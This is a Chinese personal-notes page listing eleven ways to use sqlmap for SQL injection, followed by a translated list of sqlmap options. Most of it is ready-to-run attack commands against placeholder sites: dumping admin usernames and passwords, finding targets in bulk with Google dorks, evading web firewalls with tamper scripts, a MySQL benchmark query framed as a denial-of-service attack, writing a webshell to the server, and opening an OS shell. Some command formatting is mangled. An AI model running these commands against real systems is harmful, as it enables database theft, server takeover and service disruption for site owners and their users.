---
date: 2022-07-04-星期一 09:52:15
update: 
tags: [time/year2022,time/month07]
id: 20220704095215
---

# 11种常见SQLmap使用方法



> sqlmap也是渗透中常用的一个注入工具，其实在注入工具方面，一个sqlmap就足够用了，只要你用的熟，秒杀各种工具，只是一个便捷性问题，sql注入另一方面就是手工党了，这个就另当别论了。今天把我一直以来整理的sqlmap笔记发布上来供大家参考。

表内查找字段 从数据库中搜索字段-
**sqlmap -r “c:\\tools\\request.txt” –dbms mysql -D dedecms - -search -C admin,password --dump**

-
一共有11种常见SQLmap使用方法：

### 一、SQLMAP用于Access数据库注入

(1) 猜解是否能注入

`win``:` `python sqlmap.py` `-``u` `"[http://www.xxx.com/en/CompHonorBig.asp?id=7](http://www.xxx.com/en/CompHonorBig.asp?id=7)"`

`Linux` `:` `.lmap.py` `-``u` `"[http://www.xxx.com/en/CompHonorBig.asp?id=7](http://www.xxx.com/en/CompHonorBig.asp?id=7)"`

(2) 猜解表


`win``:` `python sqlmap.py` `-``u` `"[http://www.xxx.com/en/CompHonorBig.asp?id=7](http://www.xxx.com/en/CompHonorBig.asp?id=7)"` `--tables`

`Linux``:` `.lmap.py` `-``u` `"[http://www.xxx.com/en/CompHonorBig.asp?id=7](http://www.xxx.com/en/CompHonorBig.asp?id=7)"` `--tables`

(3) 根据猜解的表进行猜解表的字段(假如通过2得到了admin这个表)

`win``:` `python sqlmap.py` `-``u` `"[http://www.xxx.com/en/CompHonorBig.asp?id=7](http://www.xxx.com/en/CompHonorBig.asp?id=7)"` `--columns -T admin`

`Linux``:` `.lmap.py` `-``u` `"[http://www.xxx.com/en/CompHonorBig.asp?id=7](http://www.xxx.com/en/CompHonorBig.asp?id=7)"` `--columns -T admin`

(4) 根据字段猜解内容(假如通过3得到字段为username和password)

`win``:` `python sqlmap.py` `-``u` `"[http://www.xxx.com/en/CompHonorBig.asp?id=7](http://www.xxx.com/en/CompHonorBig.asp?id=7)"` `--dump -T admin -C "username,password"`

`Linux``:` `.lmap.py` `-``u` `"[http://www.xxx.com/en/CompHonorBig.asp?id=7](http://www.xxx.com/en/CompHonorBig.asp?id=7)"` `--dump -T admin -C`

`"username,[url=]B[/url]password"`

### 二、SQLMAP用于Cookie注入

(1) cookie注入，猜解表

`win` `:` `python sqlmap.py` `-``u` `"[http://www.xxx.org/jsj/shownews.asp](http://www.xxx.org/jsj/shownews.asp)"` `--cookie "id=31" --table --level 2`

(2) 猜解字段，(通过1的表猜解字段，假如表为admin)

`win` `:``python sqlmap.py` `-``u` `"[http://www.xxx.org/jsj/shownews.asp](http://www.xxx.org/jsj/shownews.asp)"` `--cookie "id=31" --columns -T`

`admin` `--level 2`

(3) 猜解内容

`win` `:``python sqlmap.py` `-``u` `"[http://www.xxx.org/jsj/shownews.asp](http://www.xxx.org/jsj/shownews.asp)"` `--cookie "id=31" --dump -T`

`admin` `-``C` `"username,password"` `--level 2`

### 三、SQLMAP用于mysql中DDOS攻击(1) 获取一个Shell
`win``:`

`python sqlmap.py` `-``u [``url``]http``:``/``/``192.1``68.1``59.1``/``news.php?``id``=``1``[``/``url``]` `--sql-shell`

`Linux``:`

`sqlmap` `-``u [``url``]http``:``/``/``192.1``68.1``59.1``/``news.php?``id``=``1``[``/``url``]` `--sql-shell`

(2) 输入执行语句完成DDOS攻击
`select` `benchmark``(``99999999999``,``0``x``70726``f``62616``e``646``f``70726``f``62616``e``646``f``70726``f``62616``e``646``f``)`

### 四、SQLMAP用于mysql注入

(1) 查找数据库
`python sqlmap.py` `-``u` `"[http://www.xxx.com/link.php?id=321](http://www.xxx.com/link.php?id=321)"` `--dbs`

(2) 通过第一步的数据库查找表(假如数据库名为dataname)
`python sqlmap.py` `-``u` `"[http://www.xxx.com/link.php?id=321](http://www.xxx.com/link.php?id=321)"` `-``D dataname` `--tables`

(3) 通过2中的表得出列名(假如表为table\_name)

1

`python sqlmap.py` `-``u` `"[http://www.xxx.com/link.php?id=321](http://www.xxx.com/link.php?id=321)"` `-``D dataname` `-``T table_name` `--columns`

(4) 获取字段的值(假如扫描出id,user,password字段)
`python sqlmap.py` `-``u` `"[http://www.xxx.com/link.php?id=321](http://www.xxx.com/link.php?id=321)"` `-``D dataname` `-``T table_name` `-``C`

`"id,user,password"` `--dump`

### 五、SQLMAP中post登陆框注入

(1) 其中的search-test.txt是通过抓包工具burp suite抓到的包并把数据保存为这个txt文件

> 我们在使用Sqlmap进行post型注入时，经常会出现请求遗漏导致注入失败的情况。这里分享一个小技巧，即结合burpsuite来使用sqlmap，用这种方法进行post注入测试会更准确，操作起来也非常容易。

1\. 浏览器打开目标地址http:// www.xxx.com /Login.asp

2\. 配置burp代理(127.0.0.1:8080)以拦截请求

3\. 点击login表单的submit按钮

4\. 这时候Burp会拦截到了我们的登录POST请求

5\. 把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下

6\. 运行sqlmap并使用如下命令：

`.``/``sqlmap.py` `-``r search``-``test.txt` `-``p tfUPass`

这里参数-r 是让sqlmap加载我们的post请求rsearch-test.txt，而-p 大家应该比较熟悉，指定注入用的参数。

注入点：[http://testasp.vulnweb.com/Login.asp](http://testasp.vulnweb.com/Login.asp)

几种注入方式：./sqlmap.py -r search-test.txt -p tfUPass

(2) 自动的搜索-

`sqlmap` `-``u [``url``]http``:``/``/``testasp.vulnweb.com``/``Login.asp[``/``url``]` `--forms`

(3) 指定参数搜索
`sqlmap` `-``u [``url``]http``:``/``/``testasp.vulnweb.com``/``Login.asp[``/``url``]` `--data "tfUName=321&tfUPass=321"`

### 六、SQLMAP中Google搜索注入

inurl后面的语言是由自己定的

注入过程中如果选y是注入，如果不是选n
`sqlmap` `-``g inurl``:``php?``id``=`

### 七、SQLMAP中的请求延迟-

参数 --delay --safe-freq

`python sqlmap.py` `--dbs -u "[http://xxx.cn/index.php/Index/view/id/40.html](http://xxx.cn/index.php/Index/view/id/40.html)" --delay 1`

`python sqlmap.py` `--dbs -u "[http://xxx.cn/index.php/Index/view/id/40.html](http://xxx.cn/index.php/Index/view/id/40.html)" --safe-freq 3`

参数

### 八、SQLMAP绕过WAF防火墙-

注入点:[http://192.168.159.1/news.php?id=1](http://192.168.159.1/news.php?id=1)


`sqlmap` `-``u [``url``]http``:``/``/``192.1``68.1``59.1``/``news.php?``id``=``1``[``/``url``]` `-``v` `3` `--dbs --batch --tamper "space2morehash.py"`

space2morehash.py中可以替换space2hash.py或者base64encode.py或者charencode.py

都是编码方式

space2hash.py base64encode.py charencode.py

### 九、SQLMAP查看权限


`sqlmap` `-``u [``url``]http``:``/``/``192.1``68.1``59.1``/``news.php?``id``=``1``[``/``url``]` `--privileges`

### 十、SQLMAP伪静态注入(1) 查找数据库-

`python sqlmap.py` `-``u` `"[http://xxx.cn/index.php/Index/view/id/40.html](http://xxx.cn/index.php/Index/view/id/40.html)"` `--dbs`

(2) 通过1中的数据库查找对应的表 (假如通过1，得到的是dataname)-

`python sqlmap.py` `-``u` `"[http://xxx.cn/index.php/Index/view/id/40.html](http://xxx.cn/index.php/Index/view/id/40.html)"` `-``D dataname` `--tables`

(3) 通过2中的数据表得到字段(假如得到的是tablename表)-

1

2

`python sqlmap.py` `-``u` `"[http://xxx.cn/index.php/Index/view/id/40.html](http://xxx.cn/index.php/Index/view/id/40.html)"` `-``D dataname` `-``T`

`tablename` `--columns`

(4) 通过3得到字段值(假如从3中得到字段id，password)-

`python sqlmap.py` `-``u` `"[http://xxx.cn/index.php/Index/view/id/40.html](http://xxx.cn/index.php/Index/view/id/40.html)"` `-``D dataname` `-``T`

`tablename` `-``C` `"password"` `--dump`

### 十一、SQLMAP注入点执行命令与交互写shell

(1) 注入点：[http://192.168.159.1/news.php?id=1](http://192.168.159.1/news.php?id=1)

此处采用的是Linux系统

`sqlmap` `-``u [``url``]http``:``/``/``192.1``68.1``59.1``/``news.php?``id``=``1``[``/``url``]` `--os-cmd=ipconfig`

出现语言的选择根据实际的测试网站选择语言

指定目标站点D:/www/

(2) 获取Shell


`sqlmap` `-``u [``url``]http``:``/``/``192.1``68.1``59.1``/``news.php?``id``=``1``[``/``url``]` `--os-shell`

-
出现语言的选择根据实际的测试网站选择语言

指定目标站点D:/www/

输入ipconfig/all

创建用户和删除用户

只要权限足够大，你可以输入使用任何命令。

其他命令参考下面：

从数据库中搜索字段


`sqlmap` `-``r “c``:``\tools\request.txt” –dbms mysql` `-``D dedecms –search` `-``C admin``,``password`

在dedecms数据库中搜索字段admin或者password。

读取与写入文件

首先找需要网站的物理路径，其次需要有可写或可读权限。

–file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）

–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp\_shell）

–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径

示例：

1

`sqlmap` `-``r “c``:``\request.txt”` `-``p` `id` `–dbms mysql –``file``-``dest “e``:``\php\htdocs\dvwa\inc\include\``1.``php” –``file``-``write` `“f``:``\webshell\``1112.``php”`

使用shell命令：


`sqlmap` `-``r “c``:``\tools\request.txt”` `-``p` `id` `–dms mysql –os``-``shell`

接下来指定网站可写目录：

“E:\\php\\htdocs\\dvwa”

注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp\_dirtree函数）

sqlmap详细命令：


    
#
```
1.  `用法：python sqlmap.py [选项]`

3.  `选项：`
4.  `-h, --help 显示基本帮助信息并退出`
5.  `-hh 显示高级帮助信息并退出`
6.  `--version 显示程序版本信息并退出`
7.  `-v VERBOSE 输出信息详细程度级别：0-6（默认为 1）`

```

### 目标
```
9.  `目标：`
10.  `至少提供一个以下选项以指定目标`

12.  `-d DIRECT 直接连接数据库`
13.  `-u URL, --url=URL 目标 URL（例如："http://www.site.com/vuln.php?id=1"）`
14.  `-l LOGFILE 从 Burp 或 WebScarab 代理的日志文件中解析目标地址`
15.  `-m BULKFILE 从文本文件中获取批量目标`
16.  `-r REQUESTFILE 从文件中读取 HTTP 请求`
17.  `-g GOOGLEDORK 使用 Google dork 结果作为目标`
18.  `-c CONFIGFILE 从 INI 配置文件中加载选项`
```

### 请求
```
20.  `请求：`
21.  `以下选项可以指定连接目标地址的方式`

23.  `--method=METHOD 强制使用提供的 HTTP 方法（例如：PUT）`
24.  `--data=DATA 使用 POST 发送数据串（例如："id=1"）`
25.  `--param-del=PARA.. 设置参数值分隔符（例如：&）`
26.  `--cookie=COOKIE 指定 HTTP Cookie（例如："PHPSESSID=a8d127e.."）`
27.  `--cookie-del=COO.. 设置 cookie 分隔符（例如：;）`
28.  `--load-cookies=L.. 指定以 Netscape/wget 格式存放 cookies 的文件`
29.  `--drop-set-cookie 忽略 HTTP 响应中的 Set-Cookie 参数`
30.  `--user-agent=AGENT 指定 HTTP User-Agent`
31.  `--random-agent 使用随机的 HTTP User-Agent`
32.  `--host=HOST 指定 HTTP Host`
33.  `--referer=REFERER 指定 HTTP Referer`
34.  `-H HEADER, --hea.. 设置额外的 HTTP 头参数（例如："X-Forwarded-For: 127.0.0.1"）`
35.  `--headers=HEADERS 设置额外的 HTTP 头参数（例如："Accept-Language: fr\nETag: 123"）`
36.  `--auth-type=AUTH.. HTTP 认证方式（Basic，Digest，NTLM 或 PKI）`
37.  `--auth-cred=AUTH.. HTTP 认证凭证（username:password）`
38.  `--auth-file=AUTH.. HTTP 认证 PEM 证书/私钥文件`
39.  `--ignore-code=IG.. 忽略（有问题的）HTTP 错误码（例如：401）`
40.  `--ignore-proxy 忽略系统默认代理设置`
41.  `--ignore-redirects 忽略重定向尝试`
42.  `--ignore-timeouts 忽略连接超时`
43.  `--proxy=PROXY 使用代理连接目标 URL`
44.  `--proxy-cred=PRO.. 使用代理进行认证（username:password）`
45.  `--proxy-file=PRO.. 从文件中加载代理列表`
46.  `--tor 使用 Tor 匿名网络`
47.  `--tor-port=TORPORT 设置 Tor 代理端口代替默认端口`
48.  `--tor-type=TORTYPE 设置 Tor 代理方式（HTTP，SOCKS4 或 SOCKS5（默认））`
49.  `--check-tor 检查是否正确使用了 Tor`
50.  `--delay=DELAY 设置每个 HTTP 请求的延迟秒数`
51.  `--timeout=TIMEOUT 设置连接响应的有效秒数（默认为 30）`
52.  `--retries=RETRIES 连接超时时重试次数（默认为 3）`
53.  `--randomize=RPARAM 随机更改给定的参数值`
54.  `--safe-url=SAFEURL 测试过程中可频繁访问且合法的 URL 地址（译者注：`
55.  `有些网站在你连续多次访问错误地址时会关闭会话连接，`
56.  `后面的“请求”小节有详细说明）`
57.  `--safe-post=SAFE.. 使用 POST 方法发送合法的数据`
58.  `--safe-req=SAFER.. 从文件中加载合法的 HTTP 请求`
59.  `--safe-freq=SAFE.. 每访问两次给定的合法 URL 才发送一次测试请求`
60.  `--skip-urlencode 不对 payload 数据进行 URL 编码`
61.  `--csrf-token=CSR.. 设置网站用来反 CSRF 攻击的 token`
62.  `--csrf-url=CSRFURL 指定可提取防 CSRF 攻击 token 的 URL`
63.  `--force-ssl 强制使用 SSL/HTTPS`
64.  `--hpp 使用 HTTP 参数污染攻击`
65.  `--eval=EVALCODE 在发起请求前执行给定的 Python 代码（例如：`
66.  `"import hashlib;id2=hashlib.md5(id).hexdigest()"）`
```
### 优化
```
68.  `优化：`
69.  `以下选项用于优化 sqlmap 性能`

71.  `-o 开启所有优化开关`
72.  `--predict-output 预测常用请求的输出`
73.  `--keep-alive 使用持久的 HTTP(S) 连接`
74.  `--null-connection 仅获取页面大小而非实际的 HTTP 响应`
75.  `--threads=THREADS 设置 HTTP(S) 请求并发数最大值（默认为 1）`
```
### 注入
```
77.  `注入：`
78.  `以下选项用于指定要测试的参数，`
79.  `提供自定义注入 payloads 和篡改参数的脚本`

81.  `-p TESTPARAMETER 指定需要测试的参数`
82.  `--skip=SKIP 指定要跳过的参数`
83.  `--skip-static 指定跳过非动态参数`
84.  `--param-exclude=.. 用正则表达式排除参数（例如："ses"）`
85.  `--dbms=DBMS 指定后端 DBMS（Database Management System，`
86.  `数据库管理系统）类型（例如：MySQL）`
87.  `--dbms-cred=DBMS.. DBMS 认证凭据（username:password）`
88.  `--os=OS 指定后端 DBMS 的操作系统类型`
89.  `--invalid-bignum 将无效值设置为大数`
90.  `--invalid-logical 对无效值使用逻辑运算`
91.  `--invalid-string 对无效值使用随机字符串`
92.  `--no-cast 关闭 payload 构造机制`
93.  `--no-escape 关闭字符串转义机制`
94.  `--prefix=PREFIX 注入 payload 的前缀字符串`
95.  `--suffix=SUFFIX 注入 payload 的后缀字符串`
96.  `--tamper=TAMPER 用给定脚本修改注入数据`
```
### 检测
```
98.  `检测：`
99.  `以下选项用于自定义检测方式`

101.  `--level=LEVEL 设置测试等级（1-5，默认为 1）`
102.  `--risk=RISK 设置测试风险等级（1-3，默认为 1）`
103.  `--string=STRING 用于确定查询结果为真时的字符串`
104.  `--not-string=NOT.. 用于确定查询结果为假时的字符串`
105.  `--regexp=REGEXP 用于确定查询结果为真时的正则表达式`
106.  `--code=CODE 用于确定查询结果为真时的 HTTP 状态码`
107.  `--text-only 只根据页面文本内容对比页面`
108.  `--titles 只根据页面标题对比页面`
```
### 技术
```
110.  `技术：`
111.  `以下选项用于调整特定 SQL 注入技术的测试方法`

113.  `--technique=TECH 使用的 SQL 注入技术（默认为“BEUSTQ”，译者注：`
114.  `B: Boolean-based blind SQL injection（布尔型盲注）`
115.  `E: Error-based SQL injection（报错型注入）`
116.  `U: UNION query SQL injection（联合查询注入）`
117.  `S: Stacked queries SQL injection（堆叠查询注入）`
118.  `T: Time-based blind SQL injection（时间型盲注）`
119.  `Q: inline Query injection（内联查询注入）`
120.  `--time-sec=TIMESEC 延迟 DBMS 的响应秒数（默认为 5）`
121.  `--union-cols=UCOLS 设置联合查询注入测试的列数目范围`
122.  `--union-char=UCHAR 用于暴力猜解列数的字符`
123.  `--union-from=UFROM 设置联合查询注入 FROM 处用到的表`
124.  `--dns-domain=DNS.. 设置用于 DNS 渗出攻击的域名（译者注：`
125.  `推荐阅读《在SQL注入中使用DNS获取数据》`
126.  `http://cb.drops.wiki/drops/tips-5283.html，`
127.  `在后面的“技术”小节中也有相应解释）`
128.  `--second-url=SEC.. 设置二阶响应的结果显示页面的 URL（译者注：`
129.  `该选项用于 SQL 二阶注入）`
130.  `--second-req=SEC.. 从文件读取 HTTP 二阶请求`
```
### 指纹识别
```
132.  `：`
133.  `-f, --fingerprint 执行广泛的 DBMS 版本指纹识别`

135.  `枚举：`
136.  `以下选项用于获取后端 DBMS 的信息，结构和数据表中的数据。`
137.  `此外，还可以运行你输入的 SQL 语句`

139.  `-a, --all 获取所有信息、数据`
140.  `-b, --banner 获取 DBMS banner`
141.  `--current-user 获取 DBMS 当前用户`
142.  `--current-db 获取 DBMS 当前数据库`
143.  `--hostname 获取 DBMS 服务器的主机名`
144.  `--is-dba 探测 DBMS 当前用户是否为 DBA（数据库管理员）`
145.  `--users 枚举出 DBMS 所有用户`
146.  `--passwords 枚举出 DBMS 所有用户的密码哈希`
147.  `--privileges 枚举出 DBMS 所有用户特权级`
148.  `--roles 枚举出 DBMS 所有用户角色`
149.  `--dbs 枚举出 DBMS 所有数据库`
150.  `--tables 枚举出 DBMS 数据库中的所有表`
151.  `--columns 枚举出 DBMS 表中的所有列`
152.  `--schema 枚举出 DBMS 所有模式`
153.  `--count 获取数据表数目`
154.  `--dump 导出 DBMS 数据库表项`
155.  `--dump-all 导出所有 DBMS 数据库表项`
156.  `--search 搜索列，表和/或数据库名`
157.  `--comments 枚举数据时检查 DBMS 注释`
158.  `-D DB 指定要枚举的 DBMS 数据库`
159.  `-T TBL 指定要枚举的 DBMS 数据表`
160.  `-C COL 指定要枚举的 DBMS 数据列`
161.  `-X EXCLUDE 指定不枚举的 DBMS 标识符`
162.  `-U USER 指定枚举的 DBMS 用户`
163.  `--exclude-sysdbs 枚举所有数据表时，指定排除特定系统数据库`
164.  `--pivot-column=P.. 指定主列`
165.  `--where=DUMPWHERE 在转储表时使用 WHERE 条件语句`
166.  `--start=LIMITSTART 指定要导出的数据表条目开始行数`
167.  `--stop=LIMITSTOP 指定要导出的数据表条目结束行数`
168.  `--first=FIRSTCHAR 指定获取返回查询结果的开始字符位`
169.  `--last=LASTCHAR 指定获取返回查询结果的结束字符位`
170.  `--sql-query=QUERY 指定要执行的 SQL 语句`
171.  `--sql-shell 调出交互式 SQL shell`
172.  `--sql-file=SQLFILE 执行文件中的 SQL 语句`
```
### 
```
174.  `暴力破解：`
175.  `以下选项用于暴力破解测试`

177.  `--common-tables 检测常见的表名是否存在`
178.  `--common-columns 检测常用的列名是否存在`

180.  `用户自定义函数注入：`
181.  `以下选项用于创建用户自定义函数`

183.  `--udf-inject 注入用户自定义函数`
184.  `--shared-lib=SHLIB 共享库的本地路径`

186.  `访问文件系统：`
187.  `以下选项用于访问后端 DBMS 的底层文件系统`

189.  `--file-read=FILE.. 读取后端 DBMS 文件系统中的文件`
190.  `--file-write=FIL.. 写入到后端 DBMS 文件系统中的文件`
191.  `--file-dest=FILE.. 使用绝对路径写入到后端 DBMS 中的文件`

193.  `访问操作系统：`
194.  `以下选项用于访问后端 DBMS 的底层操作系统`

196.  `--os-cmd=OSCMD 执行操作系统命令`
197.  `--os-shell 调出交互式操作系统 shell`
198.  `--os-pwn 调出 OOB shell，Meterpreter 或 VNC`
199.  `--os-smbrelay 一键调出 OOB shell，Meterpreter 或 VNC`
200.  `--os-bof 利用存储过程的缓冲区溢出`
201.  `--priv-esc 数据库进程用户提权`
202.  `--msf-path=MSFPATH Metasploit 框架的本地安装路径`
203.  `--tmp-path=TMPPATH 远程临时文件目录的绝对路径`

205.  `访问 Windows 注册表：`
206.  `以下选项用于访问后端 DBMS 的 Windows 注册表`

208.  `--reg-read 读取一个 Windows 注册表键值`
209.  `--reg-add 写入一个 Windows 注册表键值数据`
210.  `--reg-del 删除一个 Windows 注册表键值`
211.  `--reg-key=REGKEY 指定 Windows 注册表键`
212.  `--reg-value=REGVAL 指定 Windows 注册表键值`
213.  `--reg-data=REGDATA 指定 Windows 注册表键值数据`
214.  `--reg-type=REGTYPE 指定 Windows 注册表键值类型`
```
### 通用选项
```
216.  `：`
217.  `以下选项用于设置通用的参数`

219.  `-s SESSIONFILE 从文件（.sqlite）中读入会话信息`
220.  `-t TRAFFICFILE 保存所有 HTTP 流量记录到指定文本文件`
221.  `--batch 从不询问用户输入，使用默认配置`
222.  `--binary-fields=.. 具有二进制值的结果字段（例如："digest"）`
223.  `--check-internet 在访问目标之前检查是否正常连接互联网`
224.  `--crawl=CRAWLDEPTH 从目标 URL 开始爬取网站`
225.  `--crawl-exclude=.. 用正则表达式筛选爬取的页面（例如："logout"）`
226.  `--csv-del=CSVDEL 指定输出到 CVS 文件时使用的分隔符（默认为“,”）`
227.  `--charset=CHARSET 指定 SQL 盲注字符集（例如："0123456789abcdef"）`
228.  `--dump-format=DU.. 导出数据的格式（CSV（默认），HTML 或 SQLITE）`
229.  `--encoding=ENCOD.. 指定获取数据时使用的字符编码（例如：GBK）`
230.  `--eta 显示每个结果输出的预计到达时间`
231.  `--flush-session 清空当前目标的会话文件`
232.  `--forms 解析并测试目标 URL 的表单`
233.  `--fresh-queries 忽略存储在会话文件中的查询结果`
234.  `--har=HARFILE 将所有 HTTP 流量记录到一个 HAR 文件中`
235.  `--hex 获取数据时使用 hex 转换`
236.  `--output-dir=OUT.. 自定义输出目录路径`
237.  `--parse-errors 从响应中解析并显示 DBMS 错误信息`
238.  `--preprocess=PRE.. 使用给定脚本预处理响应数据`
239.  `--repair 重新导出具有未知字符的数据（?）`
240.  `--save=SAVECONFIG 将选项设置保存到一个 INI 配置文件`
241.  `--scope=SCOPE 用正则表达式从提供的代理日志中过滤目标`
242.  `--test-filter=TE.. 根据 payloads 和/或标题（例如：ROW）选择测试`
243.  `--test-skip=TEST.. 根据 payloads 和/或标题（例如：BENCHMARK）跳过部分测试`
244.  `--update 更新 sqlmap`
```
### 杂项
```
246.  `：`
247.  `-z MNEMONICS 使用短助记符（例如：“flu,bat,ban,tec=EU”）`
248.  `--alert=ALERT 在找到 SQL 注入时运行 OS 命令`
249.  `--answers=ANSWERS 设置预定义回答（例如：“quit=N,follow=N”）`
250.  `--beep 出现问题提醒或在发现 SQL 注入时发出提示音`
251.  `--cleanup 指定移除 DBMS 中的特定的 UDF 或者数据表`
252.  `--dependencies 检查 sqlmap 缺少（可选）的依赖`
253.  `--disable-coloring 关闭彩色控制台输出`
254.  `--gpage=GOOGLEPAGE 指定页码使用 Google dork 结果`
255.  `--identify-waf 针对 WAF/IPS 防护进行彻底的测试`
256.  `--mobile 使用 HTTP User-Agent 模仿智能手机`
257.  `--offline 在离线模式下工作（仅使用会话数据）`
258.  `--purge 安全删除 sqlmap data 目录所有内容`
259.  `--skip-waf 跳过启发式检测 WAF/IPS 防护`
260.  `--smart 只有在使用启发式检测时才进行彻底的测试`
261.  `--sqlmap-shell 调出交互式 sqlmap shell`
262.  `--tmp-dir=TMPDIR 指定用于存储临时文件的本地目录`
263.  `--web-root=WEBROOT 指定 Web 服务器根目录（例如："/var/www"）`
264.  `--wizard 适合初级用户的向导界面`
```


# Quote
